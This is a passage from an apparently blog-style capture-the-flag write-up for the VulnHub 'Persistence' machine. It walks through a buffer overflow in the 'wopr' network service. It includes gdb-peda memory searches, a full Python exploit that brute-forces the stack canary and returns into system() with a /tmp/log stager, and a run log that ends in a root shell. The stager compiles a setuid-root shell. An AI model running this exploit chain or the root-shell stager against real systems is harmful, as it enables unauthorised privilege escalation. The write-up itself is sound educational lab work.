```

The address for `system()` is 'backwards' because we are working with a [little endian](http://en.wikipedia.org/wiki/Endianness) system. The 4 * A before the address to `system()` is simply padding to EIP.

## wopr - code exec
This part, by far, took me **the longest** of the entire challenge!

The next step was to get actual code to execute using `system()`. While this may sound trivial, it has challenges of its own. One of the key things I had to realize whilst getting frustrated with this was "to remember, you are trying to make a program do what it is not intended to do, expect difficulty!".

I tried to put a command in a env variable and failed.
I attempted to write a ROP chain and failed.

These failed mostly due to by own lack of understanding, tiredness and frustration. My attempts generally was to get a script `/tmp/runme` to run. `runme` was a bash script that will compile a small C shell, change ownership and set the suid bit. Yes, Persistence had `gcc` installed :)

"fail" * 100000 * 100000. That is a rough guestimate of the amount of times I tried this part.

Eventually, I finally came to the realization that I may have to search for other avenues of code execution. In fact, I completely stepped away from the VM and did something else.

Returning later with a fresh look, I run wopr through `strings` one more time:

```bash
root@kali:~/Desktop/persistence# strings  wopr
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used

[.. snip ..]

[^_]
[+] yeah, I don't think so
socket
setsockopt
bind
[+] bind complete
listen
/tmp/log          # <<<<<<<<<<<<<<<<<<<<<<<<<<
TMPLOG
[+] waiting for connections
[+] logging queries to $TMPLOG
accept
[+] got a connection
[+] hello, my name is sploitable
[+] would you like to play a game?
[+] bye!
```

See that? Can you **see** that... We have `/tmp/log` RIGHT THERE!

I confirmed that `/tmp/log` wasn't actually in use, and moved my original `/tmp/runme` script there.

The only thing that was left now was to find the location of the string `/tmp/log` in `wopr`, push that to the stack, and ride the bus home. So lets do the hard work required to find this valuable piece of the puzzle:

```bash
root@kali:~# gdb -q ./wopr
Reading symbols from wopr...(no debugging symbols found)...done.

gdb-peda$ b *main
Breakpoint 1 at 0x80487de

gdb-peda$ r
[----------------------------------registers-----------------------------------]
EAX: 0xbffff4a4 --> 0xbffff60a ("wopr")
EBX: 0xb7fbfff4 --> 0x14bd7c
ECX: 0x66a6f92e
EDX: 0x1
ESI: 0x0
EDI: 0x0
EBP: 0xbffff478 --> 0x0
ESP: 0xbffff3fc --> 0xb7e8ae36 (<__libc_start_main+230>:    mov    DWORD PTR [esp],eax)
EIP: 0x80487de (<main>: push   ebp)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80487d7 <get_reply+99>:    call   0x804865c <__stack_chk_fail@plt>
   0x80487dc <get_reply+104>:   leave
   0x80487dd <get_reply+105>:   ret
=> 0x80487de <main>:    push   ebp
   0x80487df <main+1>:  mov    ebp,esp
   0x80487e1 <main+3>:  sub    esp,0x258
   0x80487e7 <main+9>:  mov    eax,DWORD PTR [ebp+0x8]
   0x80487ea <main+12>: mov    DWORD PTR [ebp-0x23c],eax
[------------------------------------stack-------------------------------------]
0000| 0xbffff3fc --> 0xb7e8ae36 (<__libc_start_main+230>:   mov    DWORD PTR [esp],eax)
0004| 0xbffff400 --> 0x1
0008| 0xbffff404 --> 0xbffff4a4 --> 0xbffff60a ("wopr")
0012| 0xbffff408 --> 0xbffff4ac --> 0xbffff629 ("SSH_AGENT_PID=3171")
0016| 0xbffff40c --> 0xb7fe08d8 --> 0xb7e74000 --> 0x464c457f
0020| 0xbffff410 --> 0xb7ff6821 (mov    eax,DWORD PTR [ebp-0x10])
0024| 0xbffff414 --> 0xffffffff
0028| 0xbffff418 --> 0xb7ffeff4 --> 0x1cf2c
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Breakpoint 1, 0x080487de in main ()

gdb-peda$ searchmem /tmp/log
Searching for '/tmp/log' in: None ranges
Found 2 results, display max 2 items:
wopr : 0x8048c60 ("/tmp/log")
wopr : 0x8049c60 ("/tmp/log")
```

`/tmp/log` can be found in 2 places. Lets choose `0x8048c60`! Now we finally have everything we need to build the payload to send.

## wopr - the exploit
To sum up what we have to do to exploit this, we can say that we have to:

- Provide a string of size 30
- Provide the canary we have brute forced
- Pad with 4 bytes
- Write EIP to the location of `system()`
- Provide 4 bytes of JUNK (or the location of `exit()` as a return)
- Provide the location of `/tmp/log`

In my exploit, as a result of the above, I would therefore send a payload similar to this:

```text
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + "\xff\xff\xff\xff" + "AAAA" +
"\x10\xc2\x16\x00" + "JUNK" + "\x60\x8c\x04\x08"
```

I finished up coding the exploit, which eventually resulted in the following:

```python
import socket
import sys
import os

payload = "A" * 30  # amount of bytes to before the canary is hit
canary = ""     # canary that should update as its bruted

print """
            A: "So, I heard you like pain...?"
            B: "... a bit"
            C: "Well, here it is, the: "
 ____   ___  ____    _____ ____ _____ ______    ___  ____     __    ___
|    \ /  _]|    \  / ___/|    / ___/|      |  /  _]|    \   /  ]  /  _]
|  o  )  [_ |  D  )(   \_  |  (   \_ |      | /  [_ |  _  | /  /  /  [_
|   _/    _]|    /  \__  | |  |\__  ||_|  |_||    _]|  |  |/  /  |    _]
|  | |   [_ |    \  /  \ | |  |/  \ |  |  |  |   [_ |  |  /   \_ |   [_
|  | |     ||  .  \ \    | |  |\    |  |  |  |     ||  |  \     ||     |
|__| |_____||__|\_|  \___||____|\___|  |__|  |_____||__|__|\____||_____|
      _____ ____  _       ___  ____  ______
     / ___/|    \| |     /   \|    ||      |
    (   \_ |  o  ) |    |     ||  | |      |
     \__  ||   _/| |___ |  O  ||  | |_|  |_|
     /  \ ||  |  |     ||     ||  |   |  |
     \    ||  |  |     ||     ||  |   |  |
      \___||__|  |_____| \___/|____|  |__|

                A: "AKA: FU superkojiman && sagi- !!"
                A: "I also have no idea what I am doing"
"""

print "[+] Connecting & starting canary brute force..."

# start the canary brute loop. We want to brute 4 bytes ...
for x in xrange(1,5):

    # ... and try all possibilities
    for canary_byte in xrange(0, 256):

        # prepare the byte
        hex_byte = chr(canary_byte)

        # prepare the payload
        send = payload + canary + hex_byte

        # connect and send payload
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(('127.0.0.1', 3333))

        # get the inital banners
        sock.recv(35)   # [+] hello, my name is sploitable\n
        sock.recv(40)   # [+] would you like to play a game?\n
        sock.recv(5)    # >

        # send the payload
        sock.send(send)
        sock.recv(27)   # [+] yeah, I don't think so\n

        # if we have a OK response, then we will have this last part
        # as '[+] bye!\n' populated, if its wrong, not
        data =  sock.recv(64)   # [+] bye!\n
        if "bye" in data:
            print "[+] Found a possible canary value of '{0}'!".format(hex_byte.encode("hex"))
            canary += hex_byte
            sock.close()
            break

        sock.close()
    # if we cant even find the first byte, we failed already
    if len(canary) <= 0:
        print "[-] Unable to even find the first bit of the canary. No luck"
        sys.exit(0)

# The canary is our ticket out of here!
if len(canary) == 4:

    print "[+] Canary known as : {0}".format(canary.encode("hex"))
    print "[+] Writing /tmp/log to be called by wopr later"

    # ./wopr has the string /tmp/log in it. We will use this as
    # our code exec point, overwriting whatever is in it atm
    stager = """
        #!/bin/sh

        # First, prepare a small C shell and move it to /tmp with name getroot
        echo "int main(void)\n{\nsetuid(0);\nsystem(\\"/bin/sh\\");\nreturn 0;\n}" > /tmp/getroot.c

        # compile it
        /usr/bin/gcc /tmp/getroot.c -o /tmp/getroot

        # change ownership and setuid
        /bin/chown root:root /tmp/getroot
        /bin/chmod 4777 /tmp/getroot
    """

    # write the file
    with open('/tmp/log','w') as stager_file:
        stager_file.write(stager)

    # make it executable
    os.chmod('/tmp/log', 0755)

    # now, with the stack canary known and the stager ready, lets corrupt
    # EIP and sploit!
    payload += canary               # canary we bruted
    payload += "A" * 4              # padding to EIP wich is at byte 42
    payload += "\x10\x62\xe5\xb7"   # system() @ 0xb7e56210, NULL is ok cause memcpy(). Recheck location of system in gdb incase the sploit fails.
    payload += "JUNK"               # JUNK. Should probably do exit() here. Meh.
    payload += "\x60\x8c\x04\x08"   # location if /tmp/log string in .data

    # and connect && send
    print "[+] Connecting to service"
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('127.0.0.1', 3333))
    sock.recv(35)
    sock.recv(40)
    sock.recv(5)
    print "[+] Sending Payload"
    sock.send(payload)

    sock.recv(64)
    sock.close()
    print "[+] Done"

    print "[+] going to try and spawn /tmp/getroot, assuming the sploit worked :)"
    os.system("/tmp/getroot")

else:
    print "[!] Incomplete Canary. Can't continue reliably"

# done
```

A sample run would be:

```bash
bash-4.1$ ls -lah /tmp/sploit.py
-rw-rw-r--. 1 avida avida 4.0K Sep 18 10:33 /tmp/sploit.py
bash-4.1$ python /tmp/sploit.py

            A: "So, I heard you like pain...?"
            B: "... a bit"
            C: "Well, here it is, the: "
 ____   ___  ____    _____ ____ _____ ______    ___  ____     __    ___
|    \ /  _]|    \  / ___/|    / ___/|      |  /  _]|    \   /  ]  /  _]
|  o  )  [_ |  D  )(   \_  |  (   \_ |      | /  [_ |  _  | /  /  /  [_
|   _/    _]|    /  \__  | |  |\__  ||_|  |_||    _]|  |  |/  /  |    _]
|  | |   [_ |    \  /  \ | |  |/  \ |  |  |  |   [_ |  |  /   \_ |   [_
|  | |     ||  .  \ \    | |  |\    |  |  |  |     ||  |  \     ||     |
|__| |_____||__|\_|  \___||____|\___|  |__|  |_____||__|__|\____||_____|
      _____ ____  _       ___  ____  ______
     / ___/|    \| |     /   \|    ||      |
    (   \_ |  o  ) |    |     ||  | |      |
     \__  ||   _/| |___ |  O  ||  | |_|  |_|
     /  \ ||  |  |     ||     ||  |   |  |
     \    ||  |  |     ||     ||  |   |  |
      \___||__|  |_____| \___/|____|  |__|

                A: "AKA: FU superkojiman && sagi- !!"
                A: "I also have no idea what I am doing"

[+] Connecting & starting canary bruteforce...
[+] Found a possible canary value of '64'!
[+] Found a possible canary value of 'd3'!
[+] Found a possible canary value of 'c6'!
[+] Found a possible canary value of '15'!
[+] Canary known as : 64d3c615
[+] Writing /tmp/log to be called by wopr later
[+] Connecting to service
[+] Sending Payload
[+] Done
[+] going to try and spawn /tmp/getroot, assuming the sploit worked :)
sh-4.1# id
uid=0(root) gid=500(avida) groups=0(root),500(avida) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

And, as proof, we cat the flag!

```bash Persistence w00t
sh-4.1# cat /root/flag.txt
              .d8888b.  .d8888b. 888
             d88P  Y88bd88P  Y88b888
             888    888888    888888
888  888  888888    888888    888888888
888  888  888888    888888    888888
888  888  888888    888888    888888
Y88b 888 d88PY88b  d88PY88b  d88PY88b.
 "Y8888888P"  "Y8888P"  "Y8888P"  "Y888

Congratulations!!! You have the flag!

We had a great time coming up with the
challenges for this boot2root, and we
hope that you enjoyed overcoming them.

Special thanks goes out to @VulnHub for
hosting Persistence for us, and to
@recrudesce for testing and providing
valuable feedback!

Until next time,
      sagi- & superkojiman
```

## conclusion
Persistence kicked ass!! I learned a ton and that is the ultimate win. Thanks sagi- && superkojiman for an incredible challenge! Thanks Vulnhub for the hosting and community!

## thats not all
There are however a few more things I'd like to try.

- Find if and how we can root Persistence using `sysadmin-tool`
- Modify the exploit to a working ROP payload
- Explore other avenues to break out of rbash
